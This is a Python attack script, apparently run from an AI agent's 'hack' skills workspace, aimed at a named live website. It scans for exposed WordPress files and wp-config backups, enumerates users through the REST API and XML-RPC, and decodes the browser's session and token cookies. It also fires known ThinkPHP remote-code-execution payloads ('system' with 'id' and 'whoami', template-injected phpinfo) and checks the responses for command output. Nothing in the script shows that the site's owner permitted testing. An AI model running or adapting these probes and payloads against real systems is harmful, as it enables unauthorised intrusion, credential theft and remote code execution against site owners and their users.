#!/usr/bin/env python3
"""Targeted deep investigation based on recon findings."""
import sys, re, json, urllib.parse, base64
sys.stdout.reconfigure(encoding='utf-8', errors='replace')
sys.stderr.reconfigure(encoding='utf-8', errors='replace')
sys.path.insert(0, r"C:\Users\97912\.codex\skills\hack\scripts")
from cdp_launch import connect_playwright_cdp

BASE = "https://jgy09.com"
PORT = 9222

browser, pw = connect_playwright_cdp(port=PORT, stealth=True)
ctx = browser.contexts[0]

print("="*60)
print("  TARGETED DEEP INVESTIGATION")
print("="*60)

# ============ 1. WordPress Deep Scan ============
print("\n[*] === WordPress Deep Scan ===")
wp_paths = [
    "/wp-login.php", "/wp-admin/", "/wp-admin/admin-ajax.php",
    "/wp-json/", "/wp-json/wp/v2/users", "/wp-json/wp/v2/users/1",
    "/wp-json/wp/v2/posts", "/wp-json/wp/v2/pages",
    "/wp-json/wp/v2/categories", "/wp-json/wp/v2/media",
    "/wp-json/wp/v2/comments", "/wp-json/wp/v2/taxonomies",
    "/wp-json/wp/v2/settings", "/wp-json/wp/v2/themes",
    "/wp-json/wp/v2/plugins", "/wp-json/wp/v2/users?per_page=100",
    "/xmlrpc.php", "/wp-cron.php", "/wp-content/debug.log",
    "/wp-content/uploads/", "/wp-content/plugins/",
    "/wp-content/themes/", "/wp-includes/",
    "/wp-config.php", "/wp-config.php.bak", "/wp-config.php~",
    "/readme.html", "/license.txt", "/wp-content/backup-db/",
    "/wp-content/uploads/wpallimport/", "/wp-content/updraft/",
    "/wp-content/wpconfig.bak", "/wp-content/plugins/akismet/",
    "/wp-content/plugins/contact-form-7/", "/wp-content/plugins/elementor/",
    "/wp-content/plugins/woocommerce/", "/wp-content/plugins/yoast/",
    "/wp-content/plugins/all-in-one-seo-pack/",
    "/wp-content/plugins/wpforms-lite/",
    "/wp-content/plugins/duplicator/", "/wp-content/plugins/wordfence/",
    "/wp-admin/load-scripts.php?c=1&load%5B%5D=jquery-core,jquery-migrate",
    "/wp-admin/load-styles.php?c=1&load%5B%5D=dashicons,buttons",
    "/?author=1", "/?author=2", "/?author=3", "/?author=4", "/?author=5",
    "/wp-json/wp/v2/users/me", "/wp-json/wp/v2/comments?post=1",
    "/wp-json/", "/wp-json/wp/v2/", "/wp-json/oembed/1.0/embed",
    "/wp-json/oembed/1.0/proxy",
    "/wp-trackback.php", "/wp-mail.php",
    "/wp-content/plugins/index.php", "/wp-content/themes/index.php",
    "/wp-admin/install.php", "/wp-admin/upgrade.php",
    "/wp-admin/maint/repair.php", "/wp-admin/setup-config.php",
    "/wp-links-opml.php", "/wp-blog-header.php", "/wp-signup.php",
    "/wp-activate.php", "/wp-register.php",
    "/wp-content/object-cache.php", "/wp-content/advanced-cache.php",
    "/wp-content/cache/", "/wp-content/wflogs/",
    "/wp-content/uploads/elementor/",
    "/wp-content/uploads/woocommerce_uploads/",
    "/wp-content/upgrade/", "/wp-content/backups/",
    "/wp-content/themes/twentytwentyone/style.css",
    "/wp-content/themes/flatsome/style.css",
    "/wp-content/themes/avada/style.css",
    "/wp-content/themes/enfold/style.css",
    "/wp-content/themes/storefront/style.css",
    "/wp-content/plugins/woocommerce/readme.txt",
    "/wp-content/plugins/elementor/readme.txt",
    "/wp-content/plugins/contact-form-7/readme.txt",
    "/wp-content/plugins/duplicator/readme.txt",
    "/wp-content/plugins/wordfence/readme.txt",
    "/wp-content/plugins/better-wp-security/readme.txt",
    "/wp-content/plugins/all-in-one-wp-security-and-firewall/readme.txt",
    "/wp-content/plugins/wp-file-manager/readme.txt",
    "/wp-content/plugins/file-manager-advanced/readme.txt",
    "/wp-content/plugins/wpforms-lite/readme.txt",
    "/wp-content/plugins/wpforms/readme.txt",
    "/wp-content/plugins/gravityforms/readme.txt",
    "/wp-content/plugins/ninja-forms/readme.txt",
]

wp_findings = []
for path in wp_paths:
    url = BASE + path
    try:
        resp = ctx.request.get(url, timeout=10000, max_redirects=0)
    except:
        try:
            resp = ctx.request.get(url, timeout=10000)
        except:
            continue
    if not resp:
        continue
    status = resp.status
    body = resp.text()
    body_len = len(body)
    location = resp.headers.get("location", "")
    
    if status == 200 and body_len > 0:
        wp_findings.append((status, path, body_len, body, location))
    elif status in [301, 302]:
        wp_findings.append((status, path, body_len, body, location))
    elif status in [401, 403]:
        wp_findings.append((status, path, body_len, body, location))

for status, path, blen, body, loc in wp_findings:
    extra = f" -> {loc}" if loc else ""
    desc = ""
    if status == 200:
        if "wp-login" in path and ("wordpress" in body.lower() or "wp-login" in body.lower()):
            desc = " [WordPress login page!]"
        elif "wp-json/wp/v2/users" in path and "[" in body[:10]:
            try:
                users = json.loads(body)
                if isinstance(users, list):
                    names = [u.get("name","?") for u in users]
                    slugs = [u.get("slug","?") for u in users]
                    desc = f" [USER ENUM: {list(zip(names, slugs))}]"
            except:
                pass
        elif path == "/xmlrpc.php" and ("XML-RPC" in body or "xmlrpc" in body.lower()):
            desc = " [XML-RPC ENABLED!]"
        elif path == "/readme.html" and "WordPress" in body:
            ver = re.search(r'Version\s+([\d.]+)', body)
            desc = f" [WP VERSION: {ver.group(1) if ver else 'unknown'}]"
        elif path == "/wp-content/debug.log":
            desc = " [DEBUG LOG EXPOSED!]"
        elif "readme.txt" in path and body_len > 100:
            ver = re.search(r'Version:\s*([\d.]+)', body)
            plugin_name = path.split("/plugins/")[1].split("/")[0] if "/plugins/" in path else ""
            desc = f" [PLUGIN: {plugin_name} v{ver.group(1) if ver else '?'}]"
        elif "style.css" in path:
            ver = re.search(r'Version:\s*([\d.]+)', body)
            theme_name = re.search(r'Theme Name:\s*(.+)', body)
            desc = f" [THEME: {theme_name.group(1).strip() if theme_name else '?'} v{ver.group(1) if ver else '?'}]"
        elif path == "/wp-admin/" and "wp-admin" in body.lower():
            desc = " [WP-ADMIN ACCESSIBLE!]"
        elif path == "/wp-cron.php":
            desc = " [WP-CRON ACCESSIBLE]"
        elif body_len < 100:
            desc = f" [Content: {body[:80]}]"
    print(f"  [{status}] {path} ({blen}b){extra}{desc}")

# ============ 2. XML-RPC exploitation ============
print("\n[*] === XML-RPC Method Enumeration ===")
xml_body = '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>'
resp = ctx.request.post(BASE + "/xmlrpc.php", data=xml_body, headers={"Content-Type":"text/xml"}, timeout=15000)
if resp and resp.status == 200:
    body = resp.text()
    if "listMethods" in body or "<value>" in body:
        methods = re.findall(r'<value><string>([^<]+)</string></value>', body)
        print(f"  Found {len(methods)} methods:")
        dangerous = ["wp.uploadFile", "system.multicall", "wp.getUsers", "wp.getAuthors",
                     "wp.deletePost", "wp.editPost", "wp.newPost", "system.listMethods"]
        for m in methods:
            marker = " [DANGEROUS]" if m in dangerous else ""
            print(f"    {m}{marker}")
    else:
        print(f"  Response (no methods): {body[:200]}")
else:
    print(f"  XML-RPC not accessible or error (status={resp.status if resp else 'N/A'})")

# ============ 3. WordPress user enumeration via REST API ============
print("\n[*] === WordPress User Enumeration ===")
for endpoint in ["/wp-json/wp/v2/users", "/wp-json/wp/v2/users?per_page=100", "/?author=1", "/?author=2"]:
    try:
        resp = ctx.request.get(BASE + endpoint, timeout=10000, max_redirects=0)
        if resp and resp.status == 200:
            body = resp.text()
            if body.strip().startswith("["):
                users = json.loads(body)
                for u in users:
                    print(f"  User: id={u.get('id')}, name={u.get('name')}, slug={u.get('slug')}")
            elif "author/" in (resp.headers.get("location","") or body):
                loc = resp.headers.get("location","")
                name_match = re.search(r'author/([^/]+)/?', loc or body)
                if name_match:
                    print(f"  Author redirect: {name_match.group(1)}")
    except:
        pass

# ============ 4. Cookie Analysis ============
print("\n[*] === Cookie Security Analysis ===")
cookies = ctx.cookies()
issues = []
for c in cookies:
    issues_with = []
    if not c.get("secure"):
        issues_with.append("NOT-SECURE")
    if not c.get("httpOnly"):
        issues_with.append("NO-HttpOnly")
    if issues_with and any(k in c["name"].lower() for k in ["token","auth","session","pass","user","wordpress","phpsess","csrf"]):
        issues.append((c["name"], c["value"][:50], issues_with, c.get("sameSite","")))

print(f"  Sensitive cookies with security issues: {len(issues)}")
for name, val, flags, samesite in issues:
    print(f"    {name}={val}... [{','.join(flags)}] SameSite={samesite}")

# Decode WordPress cookie to get username
for c in cookies:
    if "wordpress_logged_in" in c["name"]:
        val = urllib.parse.unquote(c["value"])
        parts = val.split("|")
        if len(parts) >= 2:
            print(f"\n  [!] WordPress logged-in user: {parts[0]}")
            print(f"      Cookie: {c['name']}")
            print(f"      Expiry: {parts[1] if len(parts)>1 else 'N/A'}")

# Decode user_data cookie
for c in cookies:
    if c["name"] == "user_data":
        val = c["value"]
        print(f"\n  [!] user_data cookie: {val[:100]}")
        try:
            decoded = base64.b64decode(val.split('"value":"')[1].split('"')[0] if '"value":"' in val else val)
            print(f"      Decoded: {decoded[:100]}")
        except:
            pass

# Check savePass cookie
for c in cookies:
    if c["name"] == "savePass":
        print(f"\n  [!] savePass cookie: {c['value']}")
        
# Check tracking cookie for PHP deserialization
for c in cookies:
    if c["name"] == "tracking":
        val = urllib.parse.unquote(c["value"])
        print(f"\n  [!] tracking cookie (PHP serialized): {val[:150]}")
        if "stdClass" in val or "O:" in val:
            print("      [!] Contains PHP object - potential deserialization attack vector!")

# Check HTTP_TOKEN
for c in cookies:
    if c["name"] == "HTTP_TOKEN":
        print(f"\n  [!] HTTP_TOKEN cookie: {c['value'][:60]}... [NOT-SECURE] [NO-HttpOnly]")
        print("      Token can be stolen via XSS or MitM!")

# Check bwpath
for c in cookies:
    if c["name"] == "bwpath":
        print(f"\n  [!] bwpath cookie: {c['value'][:80]}")

# ============ 5. ThinkPHP specific checks ============
print("\n[*] === ThinkPHP Detection ===")
tp_paths = [
    "/index.php?s=/index/index", "/index.php?s=/admin",
    "/index.php?s=/admin/login", "/index.php?s=/admin/index",
    "/index.php?s=/user/login", "/index.php?s=/api",
    "/index.php?s=captcha", "/index.php?s=/index",
    "/index.php?s=/module/controller/action",
    "/index.php?s=index/think/app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1",
    "/index.php?s=index/think/app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id",
    "/index.php?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami",
    "/index.php?s=/index/\\think\\Request/input&filter=phpinfo&data=1",
    "/index.php?s=/index/\\think\\template/drive/display&content=<?php%20phpinfo();?>",
    "/public/index.php", "/runtime/", "/app/", "/config/",
    "/application/", "/thinkphp/", "/extend/", "/route/",
]
for path in tp_paths:
    url = BASE + path
    try:
        resp = ctx.request.get(url, timeout=10000, max_redirects=0)
    except:
        continue
    if not resp:
        continue
    status = resp.status
    body = resp.text()
    body_len = len(body)
    if status == 200 and body_len > 0:
        # Check for ThinkPHP debug info
        if "ThinkPHP" in body or "thinkphp" in body:
            print(f"  [!] ThinkPHP detected at {path}")
            ver = re.search(r'ThinkPHP\s+V?([\d.]+)', body)
            if ver:
                print(f"      Version: {ver.group(1)}")
        # Check for RCE result
        if "uid=" in body or "root" in body[:200]:
            print(f"  [CRITICAL] RCE via ThinkPHP at {path}!")
            print(f"      Response: {body[:200]}")
        if "phpinfo" in body.lower() and "PHP Version" in body:
            print(f"  [CRITICAL] phpinfo via ThinkPHP RCE at {path}!")
        if body_len != 8228:  # different from default response
            print(f"  [{status}] {path} ({body_len}b) [DIFFERENT FROM DEFAULT]")
    elif status in [301, 302, 401, 403]:
        loc = resp.headers.get("location","")
        print(f"  [{status}] {path} ({body_len}b) -> {loc}")

# ============ 6. Login page analysis ============
print("\n[*] === Login Page Analysis ===")
page = ctx.new_page()
page.goto(BASE + "/login/", timeout=30000, wait_until="networkidle")
login_html = page.content()
print(f"  /login/ page length: {len(login_html)}")

# Check forms on login page
forms = page.query_selector_all("form")
print(f"  Forms: {len(forms)}")
for i, form in enumerate(forms):
    action = form.get_attribute("action") or ""
    method = (form.get_attribute("method") or "GET").upper()
    inputs = form.query_selector_all("input, textarea, select")
    print(f"  Form #{i+1}: {method} {action}")
    for inp in inputs:
        name = inp.get_attribute("name") or ""
        ftype = inp.get_attribute("type") or "text"
        print(f"    - {name} (type={ftype})")

# Check for known CMS login signatures
login_title = page.title()
print(f"  Title: {login_title}")
if "wordpress" in login_html.lower():
    print("  [WordPress login page detected]")
if "wp-login" in login_html.lower():
    print("  [WP-Login form detected]")
if "woocommerce" in login_html.lower():
    print("  [WooCommerce detected]")
if "elementor" in login_html.lower():
    print("  [Elementor detected]")
if "laravel" in login_html.lower():
    print("  [Laravel detected]")
if "thinkphp" in login_html.lower():
    print("  [ThinkPHP detected]")

# Extract all script sources
scripts = page.query_selector_all("script[src]")
print(f"\n  Scripts ({len(scripts)}):")
for s in scripts:
    src = s.get_attribute("src") or ""
    print(f"    {src}")

# Check for API endpoints in page JS
api_calls = re.findall(r'(?:fetch|axios|ajax|\.post|\.get)\(["\']([^"\']+)["\']', login_html)
if api_calls:
    print(f"\n  API calls found: {api_calls}")

# Check for action URLs
actions = re.findall(r'(?:action|url|endpoint)["\']?\s*[:=]\s*["\']([^"\']+)["\']', login_html, re.I)
if actions:
    print(f"\n  Action URLs: {actions[:10]}")

page.close()

# ============ 7. Check /member/ area ============
print("\n[*] === Member Area Check ===")
resp = ctx.request.get(BASE + "/member/", timeout=10000, max_redirects=0)
if resp:
    print(f"  /member/ status: {resp.status}")
    body = resp.text()
    if resp.status == 403:
        print(f"  [403 Forbidden] Member area protected")
        # Try member sub-paths
        member_paths = ["/member/login", "/member/register", "/member/index",
                       "/member/profile", "/member/dashboard", "/member/admin"]
        for mp in member_paths:
            resp2 = ctx.request.get(BASE + mp, timeout=10000, max_redirects=0)
            if resp2:
                print(f"    [{resp2.status}] {mp} ({len(resp2.text())}b)")

# ============ 8. Check for additional vulnerabilities ============
print("\n[*] === Additional Vuln Checks ===")

# Check for directory listing
resp = ctx.request.get(BASE + "/wp-content/uploads/", timeout=10000)
if resp and resp.status == 200:
    if "Index of" in resp.text() or "Directory listing" in resp.text():
        print("  [!] Directory listing enabled at /wp-content/uploads/")

# Check for wp-config backup
for backup in ["/wp-config.php.bak", "/wp-config.php~", "/wp-config.php.save",
               "/wp-config.php.swp", "/wp-config.php.old", "/wp-config.bak",
               "/wp-config.txt", "/.wp-config.php.swp"]:
    resp = ctx.request.get(BASE + backup, timeout=5000)
    if resp and resp.status == 200 and ("DB_" in resp.text() or "define(" in resp.text()):
        print(f"  [CRITICAL] wp-config backup exposed: {backup}")
        print(f"    Content: {resp.text()[:300]}")

# Check for CVE-2018-20148 (WP < 4.9.9 SSRF via wp-cron)
# Check for CVE-2017-5487 (WP < 4.7.1 REST API user enum)
# Check for CVE-2019-9787 (WP < 5.1.1 CSRF in comments)

# Check WP version
resp = ctx.request.get(BASE + "/readme.html", timeout=10000)
if resp and resp.status == 200:
    ver = re.search(r'Version\s+([\d.]+)', resp.text())
    if ver:
        wp_ver = ver.group(1)
        print(f"\n  [WordPress Version: {wp_ver}]")
        # Check known vulnerable versions
        major, minor = wp_ver.split(".")[:2]
        if int(major) < 5 or (int(major) == 5 and int(minor) < 7):
            print(f"  [!] WordPress {wp_ver} is outdated - multiple known CVEs!")
            print(f"      - CVE-2022-21661: SQL Injection in WP_Query (< 5.8.3)")
            print(f"      - CVE-2022-21662: SQL Injection in WP REST API (< 5.8.3)")
            print(f"      - CVE-2021-39200: SSRF via REST API (< 5.8)")
            print(f"      - CVE-2017-5487: User Enumeration via REST API (< 4.7.1)")
        else:
            print(f"  WordPress {wp_ver} is relatively recent")

# Check for exposed wp-config via various methods
for path in ["/wp-config.php", "/wp-config-sample.php"]:
    resp = ctx.request.get(BASE + path, timeout=5000)
    if resp and resp.status == 200:
        body = resp.text()
        if len(body) < 100 and ("DB_" in body or "define" in body or "<?php" in body):
            print(f"  [!] {path} returned PHP source (might be misconfigured)")
        elif "DB_NAME" in body or "DB_PASSWORD" in body:
            print(f"  [CRITICAL] {path} exposed with credentials!")
            print(f"    {body[:300]}")

# ============ SUMMARY ============
print("\n" + "="*60)
print("  INVESTIGATION SUMMARY")
print("="*60)

page2 = ctx.new_page()
page2.goto(BASE, timeout=20000, wait_until="domcontentloaded")
final_html = page2.content()

# Check for mixed content
if "http://" in final_html and "https://" in final_html:
    mixed = re.findall(r'(?:src|href)=["\']http://([^"\']+)["\']', final_html)
    if mixed:
        print(f"\n  [MEDIUM] Mixed content: {len(mixed)} HTTP resources on HTTPS page")
        for m in mixed[:5]:
            print(f"    http://{m}")

page2.close()

print("\n[*] Investigation complete.")
